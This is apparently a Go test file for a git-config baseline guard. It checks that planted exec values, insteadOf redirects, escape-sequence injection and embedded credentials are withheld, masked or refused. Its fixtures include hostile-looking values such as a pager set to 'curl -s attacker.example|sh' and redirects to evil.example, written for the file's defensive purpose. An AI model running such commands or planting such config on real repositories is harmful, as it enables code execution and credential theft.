package gitguard

import (
	"bytes"
	"io"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

type baselineRun struct {
	code           int
	stdout, stderr string
}

func runBaseline(cwd string, tty bool, in string, accept bool) baselineRun {
	var stdout, stderr bytes.Buffer
	code := RunBaseline(accept, cwd, BaselineOptions{
		IsTTY: func() bool { return tty },
		In:    strings.NewReader(in),
	}, &stdout, &stderr)
	return baselineRun{code, stdout.String(), stderr.String()}
}

func (b baselineRun) want(t *testing.T, code int, stdout, stderr string) {
	t.Helper()
	if b.code != code || b.stdout != stdout || b.stderr != stderr {
		t.Fatalf("exit %d, stdout:\n%q\nstderr:\n%q\nwant exit %d, stdout:\n%q\nstderr:\n%q", b.code, b.stdout, b.stderr, code, stdout, stderr)
	}
}

func readFile(t *testing.T, path string) string {
	t.Helper()
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

func driftLine(disp, label, origin string) string {
	return disp + " (" + label + ", " + Quote(origin) + ")\n"
}

func noDrift(file string) string { return "git-config baseline " + file + ": no drift\n" }

func prompt(file string) string { return "Accept these into the baseline " + file + "? type yes: " }

const legacyTail = " — inspect and remove it; --accept never records a legacy entry\n"

func TestRunBaselineAcceptNeedsTerminal(t *testing.T) {
	r := newRepo(t)
	runBaseline(r.main, false, "yes\n", true).
		want(t, 1, "", "crew: git-baseline --accept needs your own terminal (not Claude Code's ! prefix)\n")
	if _, err := os.Stat(r.baseline()); err == nil {
		t.Fatal("a refused --accept wrote the baseline")
	}
	// #585: with a baseline on disk the same refusal must not widen it.
	r.init(t)
	before := readFile(t, r.baseline())
	r.config(t, "core.fsmonitor", "x")
	runBaseline(r.main, false, "yes\n", true).
		want(t, 1, "", "crew: git-baseline --accept needs your own terminal (not Claude Code's ! prefix)\n")
	if got := readFile(t, r.baseline()); got != before {
		t.Fatalf("baseline changed: %q, want %q", got, before)
	}
}

func TestRunBaselineNotInRepo(t *testing.T) {
	root := gitEnv(t)
	t.Setenv("GIT_CEILING_DIRECTORIES", root)
	runBaseline(root, true, "", false).want(t, 1, "", "crew: not in a git repo\n")
}

func TestRunBaselineMissing(t *testing.T) {
	r := newRepo(t)
	r.config(t, "core.fsmonitor", "x")
	runBaseline(r.main, false, "", false).want(t, 1, "",
		"git-config baseline "+r.baseline()+": none yet — the next dispatch records it, or run `crew git-baseline --accept` from your own terminal\n")
	// #557: only a dispatch records a missing baseline (TOFU before any worker
	// of the crew exists); a later review run must not trust what is there now.
	if _, err := os.Stat(r.baseline()); err == nil {
		t.Fatal("listing a missing baseline recorded one")
	}
}

func TestRunBaselineNoDrift(t *testing.T) {
	r := newRepo(t)
	r.config(t, "core.pager", "less")
	r.init(t)
	runBaseline(r.main, false, "", false).want(t, 0, noDrift(r.baseline()), "")
}

func TestRunBaselineDrift(t *testing.T) {
	r := newRepo(t)
	r.config(t, "extensions.worktreeConfig", "true")
	r.init(t)
	wt, admin := r.addWorktree(t, "w")
	r.config(t, "core.fsmonitor", "x")
	run(t, wt, "config", "--worktree", "core.pager", "less")
	runBaseline(wt, false, "", false).want(t, 1,
		execPair(r, "core.fsmonitor", "x")+
			withheldPair("core.pager", "exec value", "less", "worktree w", admin+"/config.worktree"), "")
}

func TestRunBaselinePredatesNoteBeforePairs(t *testing.T) {
	r := newRepo(t)
	writeFile(t, r.baseline(), "core.pager\nless\x00")
	r.config(t, "core.pager", "less")
	r.config(t, "core.fsmonitor", "x")
	runBaseline(r.main, false, "", false).want(t, 1,
		predatesNote(r.baseline())+execPair(r, "core.fsmonitor", "x"), "")
}

func TestRunBaselineAliasRewrite(t *testing.T) {
	r := newRepo(t)
	r.config(t, "remote.origin.url", "https://t@h.example/r")
	r.init(t)
	r.config(t, "url.https://evil.example/.insteadof", "https://t@h")
	origin := r.common + "/config"
	runBaseline(r.main, false, "", false).want(t, 1,
		driftLine(ShowPair("url.https://evil.example/.insteadof", "https://t@h", nil), "main checkout", origin)+
			"  rewritten by the alias above: "+
			withheldLine("remote.origin.url", "an insteadOf alias rewrites it", "https://t@h.example/r", "main checkout", origin)+
			ownTerminalLine("remote.origin.url", "remote.origin.url"), "")
}

// A withheld line printed only by the alias rewrite still reaches --accept's note.
func TestRunBaselineAcceptAliasRewriteNotesWithheld(t *testing.T) {
	r := newRepo(t)
	r.config(t, "remote.origin.url", "https://t@h.example/r")
	r.init(t)
	r.config(t, "url.https://evil.example/.insteadof", "https://t@h")
	origin := r.common + "/config"
	runBaseline(r.main, true, "no\n", true).want(t, 1,
		driftLine(ShowPair("url.https://evil.example/.insteadof", "https://t@h", nil), "main checkout", origin)+
			"  rewritten by the alias above: "+
			withheldLine("remote.origin.url", "an insteadOf alias rewrites it", "https://t@h.example/r", "main checkout", origin)+
			ownTerminalLine("remote.origin.url", "remote.origin.url")+
			withheldNote+prompt(r.baseline()), "crew: baseline unchanged\n")
}

func TestRunBaselineLegacy(t *testing.T) {
	r := newRepo(t)
	r.init(t)
	writeFile(t, r.common+"/remotes/foo", "URL: https://h.example/r\n")
	mustDo(t, os.Symlink("/etc/hostname", r.common+"/remotes/link"))
	if err := os.MkdirAll(r.common+"/branches/d", 0o755); err != nil {
		t.Fatal(err)
	}
	// #993: the exact stdout is what proves a legacy listing never says "no drift".
	runBaseline(r.main, false, "", false).want(t, 1,
		"legacy file entry "+Quote(r.common+"/remotes/foo")+": new or changed from the baseline"+legacyTail+
			"legacy symlink entry "+Quote(r.common+"/remotes/link")+": unsafe"+legacyTail+
			"legacy directory entry "+Quote(r.common+"/branches/d")+": unsafe"+legacyTail, "")
}

func TestRunBaselineAcceptNo(t *testing.T) {
	r := newRepo(t)
	r.init(t)
	before := readFile(t, r.baseline())
	r.config(t, "core.fsmonitor", "x")
	runBaseline(r.main, true, "no\n", true).want(t, 1,
		execPair(r, "core.fsmonitor", "x")+withheldNote+prompt(r.baseline()),
		"crew: baseline unchanged\n")
	if got := readFile(t, r.baseline()); got != before {
		t.Fatalf("baseline changed: %q, want %q", got, before)
	}
}

func TestRunBaselineAcceptYesMerges(t *testing.T) {
	r := newRepo(t)
	writeFile(t, r.baseline(), "core.pager\nless\x00\x00")
	r.config(t, "core.pager", "less")
	r.config(t, "core.fsmonitor", "x")
	r.config(t, "core.editor", "vi")
	note := predatesNote(r.baseline())
	// read -r: surrounding blanks trimmed, a final line without a newline still read.
	runBaseline(r.main, true, " yes\t", true).want(t, 0,
		note+execPair(r, "core.fsmonitor", "x")+execPair(r, "core.editor", "vi")+withheldNote+
			prompt(r.baseline())+"git-config baseline "+r.baseline()+": accepted\n", "")
	want := RedirectMark + "\x00core.editor\nvi\x00core.fsmonitor\nx\x00core.pager\nless\x00"
	if got := readFile(t, r.baseline()); got != want {
		t.Fatalf("baseline %q, want %q", got, want)
	}
	runBaseline(r.main, false, "", false).want(t, 0, noDrift(r.baseline()), "")
}

func TestRunBaselineAcceptEmpty(t *testing.T) {
	r := newRepo(t)
	runBaseline(r.main, true, "yes\n", true).want(t, 0,
		"no guarded git config yet — yes records an empty baseline\n"+prompt(r.baseline())+
			"git-config baseline "+r.baseline()+": accepted\n", "")
	if got := readFile(t, r.baseline()); got != RedirectMark+"\x00" {
		t.Fatalf("baseline %q, want the marker only", got)
	}
	runBaseline(r.main, false, "", false).want(t, 0, noDrift(r.baseline()), "")
}

func TestRunBaselineAcceptRefusesLegacy(t *testing.T) {
	r := newRepo(t)
	r.init(t)
	before := readFile(t, r.baseline())
	r.config(t, "core.fsmonitor", "x")
	writeFile(t, r.common+"/remotes/foo", "URL: https://h.example/r\n")
	// #993: the refusal lands before the prompt — stdout carries no `type yes`.
	runBaseline(r.main, true, "yes\n", true).want(t, 1,
		execPair(r, "core.fsmonitor", "x")+
			"legacy file entry "+Quote(r.common+"/remotes/foo")+": new or changed from the baseline"+legacyTail,
		"crew: git-baseline --accept refuses while legacy remotes/branches entries are listed — remove them, then re-run\n")
	if got := readFile(t, r.baseline()); got != before {
		t.Fatalf("baseline changed: %q, want %q", got, before)
	}
	r.config(t, "--unset", "core.fsmonitor")
	mustDo(t, os.Remove(r.common+"/remotes/foo"))
	runBaseline(r.main, false, "", false).want(t, 0, noDrift(r.baseline()), "")
}

func TestRunBaselineAcceptNeverWritesLegacyMark(t *testing.T) {
	r := newRepo(t)
	r.config(t, "core.fsmonitor", "x")
	runBaseline(r.main, true, "yes\n", true)
	recs, err := ReadBaseline(r.baseline())
	if err != nil {
		t.Fatal(err)
	}
	if want := []string{RedirectMark, "core.fsmonitor\nx"}; !slices.Equal(recs, want) {
		t.Fatalf("baseline %q, want %q", recs, want)
	}
}

func TestRunBaselinePinRefuses(t *testing.T) {
	r := newRepo(t)
	r.init(t)
	before := readFile(t, r.baseline())
	// The planted common dir baselines its own exec key: only the pin can
	// refuse it, and nothing it names may run (#993).
	sentinel, hit := filepath.Join(r.root, "SENTINEL"), filepath.Join(r.root, "hit.sh")
	writeFile(t, hit, "#!/bin/sh\ntouch "+sentinel+"\ncat\n")
	mustDo(t, os.Chmod(hit, 0o755))
	evil := plantRedirect(t, r, false)
	run(t, evil, "config", "core.fsmonitor", hit)
	if _, err := capture(func(w io.Writer) error { return Init(evil, w) }); err != nil {
		t.Fatal(err)
	}
	runBaseline(r.main, false, "", false).want(t, 1, "", redirectLine(r.common))
	// #993: --accept refuses on the pin too, leaving the recorded baseline
	// byte-identical.
	runBaseline(r.main, true, "yes\n", true).want(t, 1, "", redirectLine(r.common))
	if got := readFile(t, r.baseline()); got != before {
		t.Fatalf("baseline changed: %q, want %q", got, before)
	}
	if _, err := os.Stat(sentinel); err == nil {
		t.Fatal("the planted exec key ran")
	}
}

func TestRunBaselinePinRefusesRewrittenAdmin(t *testing.T) {
	r := newRepo(t)
	r.init(t)
	_, admin := r.addWorktree(t, "w")
	other := newRepo(t)
	writeFile(t, admin+"/commondir", other.common+"\n")
	got := runBaseline(r.main, false, "", false)
	want := "refusing git: " + Quote(admin) + "/commondir resolves to " + Quote(other.common) + ", not " + Quote(r.common) + "\n"
	got.want(t, 1, "", want)
}

func TestRunBaselineListingFailure(t *testing.T) {
	r := newRepo(t)
	r.init(t)
	shimGit(t, "--show-origin")
	got := runBaseline(r.main, false, "", false)
	if got.code != 1 || got.stdout != "" || !strings.HasSuffix(got.stderr, "crew: cannot list the git config of "+r.common+"\n") {
		t.Fatalf("exit %d, stdout %q, stderr %q", got.code, got.stdout, got.stderr)
	}
}

// #628: relative and absolute .git/hooks are one baselined dir, either way
// round; anything else the value names is drift.
func TestRunBaselineHooksPathCanonicalized(t *testing.T) {
	r := newRepo(t)
	abs := r.common + "/hooks"
	r.config(t, "core.hookspath", abs)
	r.reseed(t)
	r.config(t, "core.hookspath", ".git/hooks")
	runBaseline(r.main, false, "", false).want(t, 0, noDrift(r.baseline()), "")
	r.reseed(t)
	r.config(t, "core.hookspath", abs)
	runBaseline(r.main, false, "", false).want(t, 0, noDrift(r.baseline()), "")
	r.config(t, "core.hookspath", ".git/hooks-evil")
	runBaseline(r.main, false, "", false).want(t, 1,
		execPair(r, "core.hookspath", ".git/hooks-evil"), "")
}

// #557: a raw ESC/CR in a key or value prints escaped — it could otherwise
// redraw the terminal and disguise what drifted.
func TestRunBaselineEscapesWorkerBytes(t *testing.T) {
	r := newRepo(t)
	r.init(t)
	const value = "evil\x1b[2K\rcat"
	const key = "filter.a\x1b[2Kb.smudge"
	r.config(t, "filter.x.clean", value)
	r.config(t, key, "cat")
	got := runBaseline(r.main, false, "", false)
	got.want(t, 1,
		execPair(r, "filter.x.clean", value)+execPair(r, key, "cat"), "")
	if strings.ContainsAny(got.stdout+got.stderr, "\x1b\r") {
		t.Fatalf("raw control bytes reached the terminal: %q", got.stdout+got.stderr)
	}
}

// #585: with no baseline, --accept first shows every pair; typed no records
// nothing at all, typed yes records exactly what it showed.
func TestRunBaselineAcceptWithoutBaseline(t *testing.T) {
	const value = "/tmp/hit.sh"
	r := newRepo(t)
	r.config(t, "core.sshcommand", value)
	line := execPair(r, "core.sshcommand", value) + withheldNote
	runBaseline(r.main, true, "no\n", true).want(t, 1, line+prompt(r.baseline()), "crew: baseline unchanged\n")
	if _, err := os.Stat(r.baseline()); err == nil {
		t.Fatal("typed no recorded a baseline")
	}
	runBaseline(r.main, true, "yes\n", true).want(t, 0,
		line+prompt(r.baseline())+"git-config baseline "+r.baseline()+": accepted\n", "")
	if got := readFile(t, r.baseline()); got != RedirectMark+"\x00core.sshcommand\n"+value+"\x00" {
		t.Fatalf("baseline %q", got)
	}
	runBaseline(r.main, false, "", false).want(t, 0, noDrift(r.baseline()), "")
}

// The value classes as the human sees them: an exec value and any url whose
// mask would hide the endpoint are withheld behind a fingerprint; URL
// credentials print masked with a fingerprint, keeping the host visible.
func TestRunBaselineVerbatimAndMaskedValues(t *testing.T) {
	const (
		tokenURL    = "https://x-access-token:FAKETOKEN0686@github.com/o/r.git"
		proxyURL    = "http://u:fakepass0686@proxy.example:3128"
		proxyRaw    = "u:fakepass0686@proxy.example:3128"
		redirectSub = "https://x:FAKETOKEN0686@evil.example/"
	)
	for _, tc := range []struct {
		name    string
		seed    func(t *testing.T, r repo)
		drift   func(t *testing.T, r repo)
		want    func(r repo) string
		hosts   []string
		secrets []string
	}{
		{
			name:  "planted redirect",
			drift: func(t *testing.T, r repo) { r.config(t, "url.https://evil.example/.insteadof", "https://github.com/") },
			want: func(r repo) string {
				return driftLine("url.https://evil.example/.insteadof=https://github.com/", "main checkout", r.common+"/config")
			},
			hosts: []string{"evil.example"},
		},
		{
			name: "exec value with an @ is withheld",
			drift: func(t *testing.T, r repo) {
				r.config(t, "core.pager", "curl -s attacker.example|sh;: a@less")
			},
			want: func(r repo) string {
				return execPair(r, "core.pager", "curl -s attacker.example|sh;: a@less")
			},
			secrets: []string{"attacker.example"},
		},
		{
			name: "exec value that looks like a URL is withheld",
			drift: func(t *testing.T, r repo) {
				r.config(t, "core.pager", "x://curl attacker.example|sh;:@less")
			},
			want: func(r repo) string {
				return execPair(r, "core.pager", "x://curl attacker.example|sh;:@less")
			},
			secrets: []string{"attacker.example"},
		},
		{
			name: "bracketed ssh userinfo host is withheld",
			seed: func(t *testing.T, r repo) { r.config(t, "remote.origin.url", "https://github.com/o/r.git") },
			drift: func(t *testing.T, r repo) {
				r.config(t, "remote.origin.url", "ssh://[evil.example]:22@github.com/o/r.git")
			},
			want: func(r repo) string {
				return withheldPair("remote.origin.url", "outside the mask grammar", "ssh://[evil.example]:22@github.com/o/r.git", "main checkout", r.common+"/config")
			},
			secrets: []string{"evil.example"},
		},
		{
			name: "scp-style remote url is withheld",
			seed: func(t *testing.T, r repo) { r.config(t, "remote.origin.url", "https://github.com/o/r.git") },
			drift: func(t *testing.T, r repo) {
				r.config(t, "remote.origin.url", "attacker.example:x@github.com:o/r.git")
			},
			want: func(r repo) string {
				return withheldPair("remote.origin.url", "outside the mask grammar", "attacker.example:x@github.com:o/r.git", "main checkout", r.common+"/config")
			},
			secrets: []string{"attacker.example"},
		},
		{
			name:  "scheme-less http.proxy",
			drift: func(t *testing.T, r repo) { r.config(t, "http.proxy", proxyRaw) },
			want: func(r repo) string {
				return driftLine("http.proxy="+fingerprinted("***@proxy.example:3128", proxyRaw), "main checkout", r.common+"/config")
			},
			hosts:   []string{"proxy.example"},
			secrets: []string{"fakepass0686"},
		},
		{
			name: "credentials masked in values and in redirect keys, hosts kept",
			drift: func(t *testing.T, r repo) {
				r.config(t, "remote.origin.url", tokenURL)
				r.config(t, "http.proxy", proxyURL)
				r.config(t, "http.https://p.example/.proxy", proxyRaw)
				r.config(t, "url."+redirectSub+".insteadof", "https://github.com/")
			},
			want: func(r repo) string {
				origin := r.common + "/config"
				return driftLine("remote.origin.url="+fingerprinted("https://***@github.com/o/r.git", tokenURL), "main checkout", origin) +
					driftLine("http.proxy="+fingerprinted("http://***@proxy.example:3128", proxyURL), "main checkout", origin) +
					driftLine("http.https://p.example/.proxy="+fingerprinted("***@proxy.example:3128", proxyRaw), "main checkout", origin) +
					driftLine("url."+fingerprinted("https://***@evil.example/", redirectSub)+
						".insteadof=https://github.com/", "main checkout", origin)
			},
			hosts:   []string{"github.com", "proxy.example", "evil.example"},
			secrets: []string{"FAKETOKEN0686", "fakepass0686"},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r := newRepo(t)
			if tc.seed != nil {
				tc.seed(t, r)
			}
			r.init(t)
			tc.drift(t, r)
			got := runBaseline(r.main, false, "", false)
			got.want(t, 1, tc.want(r), "")
			for _, host := range tc.hosts {
				if !strings.Contains(got.stdout, host) {
					t.Errorf("the host %s vanished from:\n%s", host, got.stdout)
				}
			}
			for _, secret := range tc.secrets {
				if strings.Contains(got.stdout+got.stderr, secret) {
					t.Errorf("%s reached the screen:\n%s", secret, got.stdout)
				}
			}
			if len(tc.secrets) > 0 && !strings.Contains(got.stdout, "sha256:") {
				t.Errorf("a masked value printed no fingerprint:\n%s", got.stdout)
			}
		})
	}
}

// aliasPointer is the line that follows a withheld url.<alias>.insteadof key.
func aliasPointer(alias string) string {
	if alias == "" {
		return ""
	}
	return "  url." + urlWithheld(alias) + ".insteadof" + ownTerminal("url."+alias+".insteadof") + "\n"
}

// #686: an insteadOf alias from any scope git reads — the main checkout's, or
// the human's own global file — rewrites the remote url git contacts, so that
// url is withheld rather than masked.
func TestRunBaselineAliasFromAnyScopeRewrites(t *testing.T) {
	const url = "https://evil.example:x@github.com/o/r.git"
	r := newRepo(t)
	r.init(t)
	r.config(t, "remote.origin.url", url)
	line := withheldLine("remote.origin.url", "an insteadOf alias rewrites it", url, "main checkout", r.common+"/config")
	want := line + ownTerminalLine("remote.origin.url", "remote.origin.url")
	for _, alias := range []string{"", "git@"} {
		r.config(t, "url."+alias+".insteadof", "https://")
		disp := "url." + alias + ".insteadof"
		if alias != "" {
			disp = "url." + urlWithheld(alias) + ".insteadof"
		}
		// The alias is itself drift, and it reprints the url it rewrites.
		runBaseline(r.main, false, "", false).want(t, 1,
			want+driftLine(disp+"=https://", "main checkout", r.common+"/config")+
				aliasPointer(alias)+
				"  rewritten by the alias above: "+want, "")
		r.config(t, "--unset", "url."+alias+".insteadof")
	}
	global := filepath.Join(r.root, "gitconfig")
	writeFile(t, global, "[url \"git@\"]\n\tpushInsteadOf = https://\n")
	t.Setenv("GIT_CONFIG_GLOBAL", global)
	runBaseline(r.main, false, "", false).want(t, 1, want, "")
}

// #686: an alias only a linked worktree configures rewrites the main
// checkout's remote url, so it is withheld in the main checkout's listing.
func TestRunBaselineWorktreeAliasUnmasksMainRemote(t *testing.T) {
	const url = "https://evil.example:x@github.com/o/r.git"
	r := newRepo(t)
	wt, admin := r.addWorktree(t, "alias-wt")
	r.init(t)
	r.config(t, "extensions.worktreeconfig", "true")
	run(t, wt, "config", "--worktree", "url..insteadof", "https://")
	r.config(t, "remote.origin.url", url)
	line := withheldLine("remote.origin.url", "an insteadOf alias rewrites it", url, "main checkout", r.common+"/config")
	pointer := ownTerminalLine("remote.origin.url", "remote.origin.url")
	runBaseline(r.main, false, "", false).want(t, 1,
		line+pointer+
			driftLine("url..insteadof=https://", "worktree alias-wt", admin+"/config.worktree")+
			"  rewritten by the alias above: "+line+pointer, "")
}

// #686: an alias that lives only in the baseline still counts: git may restore
// it, and a url it rewrites must be withheld before it is ever accepted.
func TestRunBaselineBaselinedAliasRewrites(t *testing.T) {
	const url = "https://evil.invalid:x@trusted.invalid/o/r.git"
	r := newRepo(t)
	r.init(t)
	origin := r.common + "/config"
	accepted := "git-config baseline " + r.baseline() + ": accepted\n"
	alias := driftLine("url."+urlWithheld("git@")+".insteadof=https://", "main checkout", origin) + aliasPointer("git@")
	r.config(t, "url.git@.insteadof", "https://")
	runBaseline(r.main, true, "yes\n", true).want(t, 0, alias+withheldNote+prompt(r.baseline())+accepted, "")
	r.config(t, "--unset", "url.git@.insteadof")
	r.config(t, "remote.origin.url", url)
	// The alias is gone from the config; the baselined alias still rewrites.
	remote := withheldPair("remote.origin.url", "an insteadOf alias rewrites it", url, "main checkout", origin)
	runBaseline(r.main, false, "", false).want(t, 1, remote, "")
	runBaseline(r.main, true, "yes\n", true).want(t, 0, remote+withheldNote+prompt(r.baseline())+accepted, "")
	r.config(t, "url.git@.insteadof", "https://")
	runBaseline(r.main, false, "", false).want(t, 0, noDrift(r.baseline()), "")
}

// #686: --accept shows the masked form and stores the value in full, so the
// next listing still recognises it as baselined.
func TestRunBaselineAcceptMasksScreenStoresFull(t *testing.T) {
	const token = "https://x-access-token:FAKETOKEN0686@github.com/o/r.git"
	r := newRepo(t)
	r.init(t)
	r.config(t, "remote.origin.url", token)
	got := runBaseline(r.main, true, "yes\n", true)
	got.want(t, 0,
		driftLine("remote.origin.url="+fingerprinted("https://***@github.com/o/r.git", token), "main checkout", r.common+"/config")+
			prompt(r.baseline())+"git-config baseline "+r.baseline()+": accepted\n", "")
	if strings.Contains(got.stdout, "FAKETOKEN0686") {
		t.Fatalf("the token reached the screen:\n%s", got.stdout)
	}
	if !strings.Contains(got.stdout, "github.com") || !strings.Contains(got.stdout, "sha256:") {
		t.Fatalf("the host or its fingerprint vanished:\n%s", got.stdout)
	}
	stored := readFile(t, r.baseline())
	if !strings.Contains(stored, token) {
		t.Fatalf("the baseline does not store the value in full: %q", stored)
	}
	runBaseline(r.main, false, "", false).want(t, 0, noDrift(r.baseline()), "")
}

// #678: a baseline that predates redirect-key coverage says so before the
// pairs it now lists.
func TestRunBaselinePredatesNoteListsRedirectPair(t *testing.T) {
	r := newRepo(t)
	writeFile(t, r.baseline(), "")
	r.config(t, "remote.origin.url", "https://x.example/r.git")
	runBaseline(r.main, false, "", false).want(t, 1, predatesNote(r.baseline())+
		driftLine("remote.origin.url=https://x.example/r.git", "main checkout", r.common+"/config"), "")
}

// #678: --accept records the redirect marker, so the note never comes back.
func TestRunBaselineAcceptRecordsRedirectMark(t *testing.T) {
	r := newRepo(t)
	writeFile(t, r.baseline(), "")
	r.config(t, "remote.origin.url", "https://x.example/r.git")
	runBaseline(r.main, true, "yes\n", true).want(t, 0,
		predatesNote(r.baseline())+
			driftLine("remote.origin.url=https://x.example/r.git", "main checkout", r.common+"/config")+
			prompt(r.baseline())+"git-config baseline "+r.baseline()+": accepted\n", "")
	recs, err := ReadBaseline(r.baseline())
	if err != nil {
		t.Fatal(err)
	}
	if !slices.Contains(recs, RedirectMark) {
		t.Fatalf("baseline %q has no redirect mark", recs)
	}
	runBaseline(r.main, false, "", false).want(t, 0, noDrift(r.baseline()), "")
}

// #585: a baseline of one lone NUL is an empty record, not a pair; --accept
// repairs it without leaving any empty record behind.
func TestRunBaselineAcceptRepairsLoneNUL(t *testing.T) {
	r := newRepo(t)
	writeFile(t, r.baseline(), "\x00")
	r.config(t, "core.fsmonitor", "x")
	runBaseline(r.main, true, "yes\n", true).want(t, 0,
		predatesNote(r.baseline())+execPair(r, "core.fsmonitor", "x")+withheldNote+
			prompt(r.baseline())+"git-config baseline "+r.baseline()+": accepted\n", "")
	recs, err := ReadBaseline(r.baseline())
	if err != nil {
		t.Fatal(err)
	}
	for _, rec := range recs {
		if rec == "" {
			t.Fatalf("baseline %q still holds an empty record", recs)
		}
	}
	for _, want := range []string{RedirectMark, "core.fsmonitor\nx"} {
		if !slices.Contains(recs, want) {
			t.Fatalf("baseline %q lacks %q", recs, want)
		}
	}
}

// #585: --accept writes the pairs it displayed, never a re-listing: a key
// planted after the last listing must not be laundered into the baseline.
func TestRunBaselineAcceptWritesOnlyShownPairs(t *testing.T) {
	r := newRepo(t)
	r.addWorktree(t, "w")
	r.init(t)
	count := filepath.Join(r.root, "ctr")
	shimPlantGit(t, r.main, count)
	got := runBaseline(r.main, true, "yes\n", true)
	if got.code != 0 {
		t.Fatalf("exit %d, stdout %q, stderr %q", got.code, got.stdout, got.stderr)
	}
	recs, err := ReadBaseline(r.baseline())
	if err != nil {
		t.Fatal(err)
	}
	// The shim plants once per listing: only a value this run displayed may be
	// recorded, and a withheld value shows only as its fingerprint.
	var planted int
	for _, rec := range recs {
		if k, v, ok := strings.Cut(rec, "\n"); ok && k == "core.fsmonitor" {
			if !strings.Contains(got.stdout, "[sha256:"+sha8(v)+"]") {
				t.Fatalf("recorded a pair it never displayed: %q\n%s", rec, got.stdout)
			}
			planted++
		}
	}
	if planted == 0 {
		t.Fatalf("the planted key was never recorded, so the run listed once: %q", recs)
	}
	last := strings.TrimSpace(readFile(t, count))
	if slices.Contains(recs, "core.fsmonitor\n/evil"+last) {
		t.Fatalf("the key planted after the last listing was recorded: %q", recs)
	}
}

// A drift key whose URL subsection cannot be masked prints withheld, with the
// command that reads it in the human's own terminal; the userinfo never prints.
func TestRunBaselineWithheldKeyPointsToOwnTerminal(t *testing.T) {
	r := newRepo(t)
	r.init(t)
	r.config(t, "http.https://u:tok@[::1]/.proxy", "proxy.example:3128")
	kd := "http." + urlWithheld("https://u:tok@[::1]/") + ".proxy"
	got := runBaseline(r.main, false, "", false)
	got.want(t, 1,
		driftLine(kd+"=proxy.example:3128", "main checkout", r.common+"/config")+
			"  "+kd+` — check it in your own terminal (od shows one byte per cell; each entry ends at \0), from each checkout or worktree that may set it: git config -z --show-origin --get-regexp `+Quote(`^http\.`)+" | od -An -c -v\n", "")
	if strings.Contains(got.stdout+got.stderr, "tok") {
		t.Fatalf("userinfo leaked:\n%s%s", got.stdout, got.stderr)
	}
}

// withheldLine is a listed pair whose value is withheld behind its fingerprint.
func withheldLine(kd, reason, v, label, origin string) string {
	return driftLine(kd+": value withheld ("+reason+") [sha256:"+sha8(v)+"]", label, origin)
}

func ownTerminalLine(kd, k string) string { return "  " + kd + ownTerminal(k) + "\n" }

// withheldPair is the withheld line of k=v and the pointer under it.
func withheldPair(k, reason, v, label, origin string) string {
	return withheldLine(ShowKey(k), reason, v, label, origin) + ownTerminalLine(ShowKey(k), k)
}

// execPair is withheldPair for an exec value in the main checkout's config.
func execPair(r repo, k, v string) string {
	return withheldPair(k, "exec value", v, "main checkout", r.common+"/config")
}

const withheldNote = "withheld above: type yes only if a plain `crew git-baseline` listing showed the same sha256 for each, and you then checked each value with the git config command under it\n"

func TestRunBaselineWithholdsCredentialedValues(t *testing.T) {
	const (
		token     = "FAKETOKEN1400"
		helper    = "!f() { echo password=" + token + "; }; f"
		aliasKey  = "url.x.pushinsteadof"
		hasconfig = "includeif.hasconfig:remote.*.url:https://u:" + token + "@h.example/**.path"
	)
	regexpPointer := ` — check it in your own terminal (od shows one byte per cell; each entry ends at \0), from each checkout or worktree that may set it: git config -z --show-origin --get-regexp ` + Quote(`^includeif\.`) + " | od -An -c -v"
	for _, tc := range []struct {
		name      string
		pre, post func(t *testing.T, r repo)
		want      func(r repo) string
	}{
		{"alias rewrites a baselined remote url", func(t *testing.T, r repo) {
			r.config(t, "remote.origin.url", "https://u:"+token+"@github.com/o/r.git")
		}, func(t *testing.T, r repo) { r.config(t, aliasKey, "https://") },
			func(r repo) string {
				origin := r.common + "/config"
				return driftLine(aliasKey+"=https://", "main checkout", origin) +
					"  rewritten by the alias above: " +
					withheldLine("remote.origin.url", "an insteadOf alias rewrites it", "https://u:"+token+"@github.com/o/r.git", "main checkout", origin) +
					ownTerminalLine("remote.origin.url", "remote.origin.url")
			}},
		{"remote url outside the mask grammar", nil, func(t *testing.T, r repo) {
			r.config(t, "remote.origin.url", "https://u:"+token+"@git_srv/r.git")
		}, func(r repo) string {
			return withheldLine("remote.origin.url", "outside the mask grammar", "https://u:"+token+"@git_srv/r.git", "main checkout", r.common+"/config") +
				ownTerminalLine("remote.origin.url", "remote.origin.url")
		}},
		{"proxy outside the mask grammar", nil, func(t *testing.T, r repo) {
			r.config(t, "http.proxy", "http://u:"+token+"@[::1]:3128")
		}, func(r repo) string {
			return withheldLine("http.proxy", "outside the mask grammar", "http://u:"+token+"@[::1]:3128", "main checkout", r.common+"/config") +
				ownTerminalLine("http.proxy", "http.proxy")
		}},
		{"exec credential helper", nil, func(t *testing.T, r repo) {
			r.config(t, "credential.helper", helper)
		}, func(r repo) string {
			return withheldLine("credential.helper", "exec value", helper, "main checkout", r.common+"/config") +
				ownTerminalLine("credential.helper", "credential.helper")
		}},
		{"exec credential helper under a url subsection", nil, func(t *testing.T, r repo) {
			r.config(t, "credential.https://h.example.helper", helper)
		}, func(r repo) string {
			k := "credential.https://h.example.helper"
			return withheldLine(ShowKey(k), "exec value", helper, "main checkout", r.common+"/config") +
				ownTerminalLine(ShowKey(k), k)
		}},
		{"hasconfig include pattern with userinfo", nil, func(t *testing.T, r repo) {
			r.config(t, hasconfig, filepath.Join(r.root, "nonexistent.cfg"))
		}, func(r repo) string {
			kd := "includeif." + urlWithheld("hasconfig:remote.*.url:https://u:"+token+"@h.example/**") + ".path"
			return withheldLine(kd, "exec value", filepath.Join(r.root, "nonexistent.cfg"), "main checkout", r.common+"/config") +
				"  " + kd + regexpPointer + "\n"
		}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r := newRepo(t)
			if tc.pre != nil {
				tc.pre(t, r)
			}
			r.init(t)
			tc.post(t, r)
			got := runBaseline(r.main, false, "", false)
			if strings.Contains(got.stdout+got.stderr, token) {
				t.Errorf("the token reached the screen:\n%s%s", got.stdout, got.stderr)
			}
			got.want(t, 1, tc.want(r), "")
		})
	}
}

func TestRunBaselineAcceptNotesWithheldValues(t *testing.T) {
	const helper = "!f() { echo password=FAKETOKEN1400; }; f"
	r := newRepo(t)
	r.init(t)
	before := readFile(t, r.baseline())
	r.config(t, "credential.helper", helper)
	got := runBaseline(r.main, true, "no\n", true)
	if strings.Contains(got.stdout+got.stderr, "FAKETOKEN1400") {
		t.Errorf("the token reached the screen:\n%s%s", got.stdout, got.stderr)
	}
	got.want(t, 1,
